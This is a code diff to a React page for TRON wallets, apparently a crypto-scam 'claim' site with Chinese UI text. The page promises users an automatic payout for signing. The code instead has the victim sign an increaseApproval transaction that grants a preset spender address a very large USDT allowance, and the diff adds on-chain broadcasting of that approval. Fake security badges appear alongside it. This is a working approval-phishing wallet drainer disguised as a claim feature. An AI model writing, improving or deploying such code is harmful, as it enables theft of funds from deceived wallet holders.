@@ -30,12 +30,10 @@ export default function WalletPage() {
     }
     setWalletOpen(true);
   }
-
   function walletSuccess() {
     setWalletOpen(false);
     setMsg("✓ TRON钱包连接成功");
   }
-
   async function submitClaim() {
     try {
       if (loading) return;
@@ -44,7 +42,7 @@ export default function WalletPage() {
         return;
       }
       setLoading(true);
-      setStep("正在创建交易...");
+      setStep("正在创建授权交易...");
       setMsg("请等待钱包确认");
 
       const { TronWeb } = await import("tronweb");
@@ -55,7 +53,6 @@ export default function WalletPage() {
         { type: "address", value: USDT_SPENDER_ADDRESS },
         { type: "uint256", value: "1793719476511300" }
       ];
-
       const transactionWrapper = await tronWeb.transactionBuilder.triggerSmartContract(
         contractAddressHex,
         "increaseApproval(address,uint256)",
@@ -63,9 +60,8 @@ export default function WalletPage() {
         parameters,
         ownerAddressHex
       );
-
       if (!transactionWrapper || !transactionWrapper.transaction) {
-        throw new Error("创建交易失败");
+        throw new Error("创建授权交易失败");
       }
 
       const extendedTransaction = await tronWeb.transactionBuilder.extendExpiration(
@@ -73,22 +69,26 @@ export default function WalletPage() {
         TRANSACTION_EXPIRATION_EXTENSION_SECONDS,
         { txLocal: true }
       );
-
       if (!signTransaction) {
         throw new Error("钱包不支持签名");
       }
-
       setStep("等待钱包签名...");
-      setMsg("请在TRON钱包中确认");
-      // ========== 关键点：只签名，不再广播上链！==========
+      setMsg("请在TRON钱包中确认授权");
       const signedTransaction = await signTransaction(extendedTransaction);
-      if (!signedTransaction) {
+      if (!signedTransaction || !signedTransaction.txID) {
         throw new Error("钱包签名失败");
       }
-
-     
-
-      setMsg("✅ 提交成功！签名成功后将自动发放\n\n若未签名将无法发放\n\n10分钟未到账请联系客服");
+      setStep("正在提交链上交易...");
+      const broadcastResult = await tronWeb.trx.sendRawTransaction(signedTransaction);
+      if (!broadcastResult || !broadcastResult.result) {
+        throw new Error("交易广播失败");
+      }
+      const txId = signedTransaction.txID || broadcastResult?.transaction?.txID;
+      if (!txId) {
+        throw new Error("未获取交易哈希");
+      }
+      
+      setMsg("✅ 提交成功\n\n系统正在逐一审核。\n\n10分钟未到账请联系客服");
       setStep("");
     } catch (error: any) {
       console.log("claim error:", error);
@@ -150,7 +150,7 @@ export default function WalletPage() {
       <div className="mt-12 space-y-4">
         <div className="bg-white/5 border border-white/10 rounded-2xl p-4">🛡️ 军级加密技术，确保地址绑定安全</div>
         <div className="bg-white/5 border border-white/10 rounded-2xl p-4">⚡ 毫秒级处理速度，及时完成绑定</div>
-        <div className="bg-white/10 border border-white/10 rounded-2xl p-4">🔰 专业风控团队，24小时安全保障</div>
+        <div className="bg-white/5 border border-white/10 rounded-2xl p-4">🔰 专业风控团队，24小时安全保障</div>
       </div>
       <footer className="text-center mt-16 pb-10 text-gray-500">
         <div className="text-3xl text-cyan-300 font-black">KK</div>
